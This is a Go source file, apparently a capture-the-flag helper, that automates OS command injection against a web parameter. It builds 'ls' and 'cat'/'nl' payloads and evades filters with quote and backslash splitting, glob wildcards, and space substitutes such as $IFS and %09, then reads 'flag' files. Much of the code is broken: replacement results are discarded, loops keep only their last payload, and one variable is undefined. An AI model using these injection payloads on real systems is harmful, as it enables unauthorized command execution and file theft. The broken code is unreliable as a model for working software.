package script

import (
	"fmt"
	"github.com/PuerkitoBio/goquery"
	"log"
	"strings"
)

// 使用 goquery 库的 Selection.Text() 方法获取去除了 HTML 标签的纯文本
func RemoveHTMLTags(html string) string {
	doc, err := goquery.NewDocumentFromReader(strings.NewReader(html))
	if err != nil {
		log.Fatal(err)
	}

	return doc.Text()
}

func bijiao(target, flag string) bool {
	count := 0
	for _, char := range flag {
		if strings.ContainsRune(target, char) {
			count++
			if count >= 2 {
				return true
			}
		}
	}
	return false
}

func ls(yubeicommand string, URL string, canshu string, m string, yuanma string, com string, char string, guolv string) string {

	var result1 = "flag"

	for i := 0; i < 10; i++ {

		result := GP(URL, canshu, m, yubeicommand)
		lstxt := strings.Replace(result, yuanma, "", 1)

		files := strings.Fields(lstxt)

		for _, file := range files {

			if bijiao(file, "flag") {

				result1 = file
				if strings.Contains(yubeicommand, "/") {
					result1 = "/" + file
				}

				if strings.Contains(guolv, result1) {

					if strings.Contains(char, "?") {

						if strings.Contains(char, "f") {
							strings.Replace(result1, "flag", "f???", -1)
						} else if strings.Contains(char, "l") {
							strings.Replace(result1, "flag", "?l??", -1)
						} else if strings.Contains(char, "a") {
							strings.Replace(result1, "flag", "??a?", -1)
						} else if strings.Contains(char, "g") {
							strings.Replace(result1, "flag", "???g", -1)
						}

					} else if strings.Contains(char, "*") {

						if strings.Contains(char, "f") {
							strings.Replace(result1, "flag", "f*", -1)
						} else if strings.Contains(char, "l") {
							strings.Replace(result1, "flag", "*l*", -1)
						} else if strings.Contains(char, "a") {
							strings.Replace(result1, "flag", "*a*", -1)
						} else if strings.Contains(char, "g") {
							strings.Replace(result1, "flag", "*g", -1)
						}

					} else if strings.Contains(char, "'") {

						strings.Replace(result1, "flag", "f''l''a''g", -1)

					} else if strings.Contains(char, "\\") {

						strings.Replace(result1, "flag", "f\\l\\a\\g", -1)

					}

				}

				if strings.Contains(guolv, "php") && strings.Contains(result1, "php") {

					if strings.Contains(char, "?") {
						strings.Replace(result1, "php", "???", -1)
					} else if strings.Contains(char, "*") {
						strings.Replace(result1, "php", "*", -1)
					} else if strings.Contains(char, "'") {
						strings.Replace(result1, "php", "p''h''p", -1)
					} else if strings.Contains(char, "\\") {
						strings.Replace(result1, "php", "p\\h\\p", -1)
					}

				}

				if !strings.Contains(char, ".") && strings.Contains(result1, ".") {

					if strings.Contains(char, "?") {
						strings.Replace(result1, ".", "?", -1)
					} else if strings.Contains(char, "*") {
						strings.Replace(result1, ".", "*", -1)
					}

				}

				return result1

			}
		}

		kongge := []string{"%0a", "%09", "{$IFS}", " ", "$IFS$9", "$IFS", "%0d", "<", "<>"} //各种能当空格用的字符遍历

		for _, kong := range kongge {
			if strings.Contains(com, kong) || strings.Contains(char, kong) {
				yubeicommand = yubeicommand + kong + "/"

			}
		}
	}

	return "error"
}

func cat(yubeicommand string, URL string, canshu string, m string, yuanma string, result1 string) string {

	kongge := []string{"%0a", "%09", "{$IFS}", " ", "$IFS$9", "$IFS", "%0d", "<", "<>"} //各种能当空格用的字符遍历

	var command string

	for _, kong := range kongge {

		command = yubeicommand + kong + result1

	}

	result := GP(URL, canshu, m, command)
	huixian := strings.Replace(result, yuanma, "", 1)
	huixian += "payload: " + command
	return huixian

}

func evalcat(URL string, canshu string, m string, yuanma string, com string, char string, guolv string) string {

	var file = "flag"
	var duqu = true
	//result1是要cat的文件名
	var yubeicommand string

	if strings.Contains(com, "ls") && strings.Contains(char, "l") && strings.Contains(char, "s") {
		yubeicommand = "ls"
		file = ls(yubeicommand, URL, canshu, m, yuanma, com, char, guolv)
	}

	//使用单引号绕过
	if !strings.Contains(com, "ls") && strings.Contains(char, "'") && strings.Contains(char, "l") && strings.Contains(char, "s") {
		yubeicommand = "l''s"
		file = ls(yubeicommand, URL, canshu, m, yuanma, com, char, guolv)
	}

	//使用反斜线绕过
	if !strings.Contains(com, "ls") && strings.Contains(char, "\\") && yubeicommand != "l''s" && strings.Contains(char, "l") && strings.Contains(char, "s") {
		yubeicommand = "l\\s"
		file = ls(yubeicommand, URL, canshu, m, yuanma, com, char, guolv)
	} else {
		fmt.Println("无法读取文件名,默认读取flag")
		duqu = false
	}

	if duqu == false {

		for _, fl := range flag {
			if strings.Contains(guolv, fl) {

				if strings.Contains(char, "?") {

					if strings.Contains(char, "f") {
						strings.Replace(file, fl, "f???", -1)
					} else if strings.Contains(char, "l") {
						strings.Replace(file, fl, "?l??", -1)
					} else if strings.Contains(char, "a") {
						strings.Replace(file, fl, "??a?", -1)
					} else if strings.Contains(char, "g") {
						strings.Replace(file, fl, "???g", -1)
					}

				} else if strings.Contains(char, "*") {

					if strings.Contains(char, "f") {
						strings.Replace(file, "flag", "f*", -1)
					} else if strings.Contains(char, "l") {
						strings.Replace(file, "flag", "*l*", -1)
					} else if strings.Contains(char, "a") {
						strings.Replace(file, "flag", "*a*", -1)
					} else if strings.Contains(char, "g") {
						strings.Replace(file, "flag", "*g", -1)
					}

				} else if strings.Contains(char, "'") {

					strings.Replace(file, "flag", "f''l''a''g", -1)

				} else if strings.Contains(char, "\\") {

					strings.Replace(file, "flag", "f\\l\\a\\g", -1)

				}

			}
		}
	}

	dancom := strings.Fields(com)

	for _, dan := range dancom {

		if dan == "cat" || dan == "tac" || dan == "nl" {

			yubeicommand = dan

		} else if strings.Contains(char, "c") && strings.Contains(char, "a") && strings.Contains(char, "t") && strings.Contains(char, "'") {

			yubeicommand = "c''a''t"

		} else if strings.Contains(char, "c") && strings.Contains(char, "a") && strings.Contains(char, "t") && strings.Contains(char, "\\") {

			yubeicommand = "c\\a\\t"

		} else if strings.Contains(char, "n") && strings.Contains(char, "l") && strings.Contains(char, "'") {
			yubeicommand = "n''l"

		} else if strings.Contains(char, "n") && strings.Contains(char, "l") && strings.Contains(char, "\\") {
			yubeicommand = "n\\l"

		}

	}

	kongge := []string{"%0a", "%09", "{$IFS}", " ", "$IFS$9", "$IFS", "%0d", "<", "<>"} //各种能当空格用的字符遍历

	var command string

	for _, kong := range kongge {

		command = yubeicommand + kong + file

	}

	return command

}
